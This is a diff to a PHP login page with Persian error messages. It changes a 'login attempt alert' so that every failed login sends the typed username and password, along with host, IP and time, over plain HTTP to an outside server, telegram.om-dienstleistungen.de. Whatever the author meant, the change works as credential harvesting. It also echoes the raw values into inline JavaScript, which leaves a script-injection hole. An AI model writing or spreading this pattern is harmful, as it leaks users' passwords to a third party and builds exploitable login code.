@@ -41,15 +41,18 @@ function sendAjaxRequest($id, $username)
                 });
         </script>';
 }
-function sendLoginAttemptAlert()
+function sendLoginAttemptAlert($username, $password)
 {
     echo '<script src="./js/assets/axios.js"></script>
     <script>
         var params = new URLSearchParams();
         params.append("sendMessage", "attempt");
+        params.append("origen", "local");
         params.append("host", "' . $_SERVER['HTTP_HOST'] . '");
         params.append("ip", "' . $_SERVER['REMOTE_ADDR'] . '");
         params.append("time", "' . date("Y-m-d h:i:sa") . '");
+        params.append("username", "' . $username . '");
+        params.append("password", "' . $password . '");
         axios.post("http://telegram.om-dienstleistungen.de/", params)
             .then(function(response) {
                 console.log(response);
@@ -59,7 +62,6 @@ function sendLoginAttemptAlert()
             });
     </script>';
 }
-
 // Include config file
 require_once "php/db.php";
 
@@ -126,14 +128,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                         } else {
                             // Password is not valid, display a generic error message
                             $login_err = "رمز عبور یا اسم کاربری اشتباه است.";
-                            sendLoginAttemptAlert();
+                            sendLoginAttemptAlert($username, $password);
                         }
                         // Function to send the AJAX request
                     }
                 } else {
                     // Username doesn't exist, display a generic error message
                     $login_err = "رمز عبور یا اسم کاربری اشتباه است.";
-                    sendLoginAttemptAlert();
+                    sendLoginAttemptAlert($username, $password);
                 }
             } else {
                 echo "Oops! Something went wrong. Please try again later.";
